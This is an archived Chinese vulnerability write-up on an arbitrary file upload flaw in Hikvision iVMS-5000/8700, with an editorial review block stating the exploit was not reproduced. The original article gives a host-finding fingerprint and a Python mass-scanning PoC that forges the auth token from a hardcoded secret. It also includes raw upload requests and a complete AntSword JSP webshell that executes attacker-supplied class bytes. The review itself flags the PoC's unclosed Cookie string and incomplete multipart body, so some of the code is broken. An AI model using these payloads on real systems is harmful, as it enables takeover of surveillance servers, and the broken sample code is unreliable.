---
source: "MrWQ/vulnerability-paper"
id: "vw-54190e5390e07381881d53b1"
entity_id: "ve-54190e5390e07381881d53b1"
schema_version: "1"
title: "海康威视 iVMS eps 上传接口与令牌绑定历史分析（样例待核）"
product: "Hikvision iVMS-5000/8700"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "token绑定完整URL，版本仅产品系列；带会话但角色未明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%20iVMS%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%880day%EF%BC%89.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/AyUlf2p80_CTCnCB4w058w"
source_status: "recorded"
---

# 海康威视 iVMS eps 上传接口与令牌绑定历史分析（样例待核）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-5000/8700
- 本文讨论：eps/api/resourceOperations/upload硬编码token与上传
- 版本、权限与配置前提：token绑定完整URL，版本仅产品系列；带会话但角色未明
- 资料类型：token绕过上传分析；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

保留正文对 eps 上传入口及 URL 绑定摘要机制的分析，按待核技术资料收录。Cookie 字符串和 multipart 字段缺失限制了样例的可运行性，但不抹去前文机制说明；HTTP 200 不能证明上传或执行成功，原标题的 0day 状态、具体构建与会话要求仍未确认。

### 逐项校订

- Python Cookie字符串未闭合导致语法错误
- 检测只看HTTP200且未上传验证，易误报；异常全吞没
- multipart缺name/filename和终止边界，非完整上传请求
- token描述url需含接口路径而非只站点；0day/在野状态缺日期和来源
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- Cookie 字符串与 multipart 的字段在原文中缺失，不能猜出合法会话或完整表单。保留 URL 绑定摘要机制及原始片段，缺失数据标为待核；HTTP 200 不代表上传或执行成功。

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 具体构建、会话要求与受影响产品范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AyUlf2p80_CTCnCB4w058w)

### **声明：本公众号所发布的文章及工具只限交流学习，如有侵权，请告知我们立即删除，文章中涉及的程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。**

0x01 产品简介  

        海康威视 iVMS 集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。

0x02 漏洞概述

    海康威视 iVMS 系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造 token，请求 / resourceOperations/upload 接口任意上传文件，导致获取服务器 webshell 权限，同时可远程进行恶意代码执行。

0x03 影响范围
---------

海康威视综合安防系统 iVMS-5000

海康威视综合安防系统 iVMS-8700

0x04 复现环境
---------

鹰图指纹：web.body="/views/home/file/installPackage.rar"

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtexwpqsTURgjgVKcvQJT2BLZNsjLAc8mkNIkTbTXGO8uydlGKZaMyjA/640?wx_fmt=png)

0x05 漏洞复现 
----------

检测脚本 PoC:https://github.com/sccmdaveli/hikvision-poc

```
import requests
import urllib3
import urllib
import hashlib
import argparse
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()
head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Session
}
def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return (input_name.hexdigest()).upper()
def poc(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
    else:
        path = "/eps/api/resourceOperations/upload?token="
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=pocurl,headers=head,data=data,verify=False,timeout=3)
        if response.status_code==200:
            print(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞")
    except:
        pass
if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ivms.py -u http://xxxx\npython3 ivms.py -f file.txt',
                                     description='ivms漏洞检测poc',
                                     )
    p = parser.add_argument_group('ivms 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    if args.file:
        for i in open(args.file,"r").read().split("\n"):
            poc(i)

```

**使用方式：**

单个 url 检测：

```
python3 ivms-poc.py -u url

```

多个 url 检测:

```
python3 ivms-poc.py -f file.txt

```

 效果：

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtNvIEROb4z9Jtic67MLZG2SSsEDHLOyNwE3CjrXkUe18YPeozLzNmlCg/640?wx_fmt=png)

手动复现 

漏洞 url:/eps/api/resourceOperations/upload

bp 抓取首页包，尝试访问接口（发现 token 需要进行鉴权）

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtk6enTCRwPnxics5oJUZib20Ffcszh7qYicCOLDMQcHThicxqm4kGnQukRQ/640?wx_fmt=png)

```http
POST /eps/api/resourceOperations/upload HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://you-ip
Connection: close
Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
Upgrade-Insecure-Requests: 1
Content-Length: 62
service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action

```

构造 token 绕过认证  （内部机制：如果 token 值与请求 url+secretkey 的 md5 值相同就可以绕过认证）

secretkey 是代码里写死的（默认值：secretKeyIbuilding）

token 值需要进行 MD5 加密（32 位大写）

组合：token=MD5(url+"secretKeyIbuilding")

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvthHksh4GrJo3cusr67kH8Uu8EWKIu6MXticWs3cAf4Nyyn4S0SrPYyqg/640?wx_fmt=png)

重新验证

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtShR5oNsia4kWhwibbTfytvaPcOrnWJZQ0M9QrzJEXZBo44ZeELAUeDXA/640?wx_fmt=png)

可以看到，成功绕过

构造文件上传 payload

```http
POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
Upgrade-Insecure-Requests: 1
Content-Length: 174
------WebKitFormBoundaryGEJwiloiPo
Content-Disposition: form-data; 
Content-Type: image/jpeg
test
------WebKitFormBoundaryGEJwiloiPo

```

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtgzZ6uXmw87z6D9UrjSfzAnvsGLeUSaN0HYG7uBHNWetk7Wia7fChRhw/640?wx_fmt=png)

显示上传成功且返回了 resourceUuid 值

验证路径：http://url/eps/upload/resourceUuid 的值. jsp

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtBvC4iaBoxCrrWVWialKEpp6g1DhXfXGlLWEPIwpeGBNbgekpFZGjrtDA/640?wx_fmt=png)

0x06 漏洞利用
---------

直接上传蚁剑 jsp 马子

```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>

```

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvtILN4exE2Q6sAI6aRztfGLDY4UNWosDcOVzt9Jg896ICmh22a2e83sg/640?wx_fmt=png)

上传成功，尝试连接

![](https://mmbiz.qpic.cn/mmbiz_png/byXNVsHKA4r5bGpNjUfImPmZGLHicNqvt6iclpicADRfXLrfDJCwHlHwxxg86giaUczhhSohKeicgJ1WVDmaibJvDTwA/640?wx_fmt=png)

0x07 修复建议
---------

      关闭互联网暴露面访问的权限，文件上传模块做好权限强认证。

原文链接：https://blog.csdn.net/qq_41904294/article/details/130807691

原文作者：OidBoy_G

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
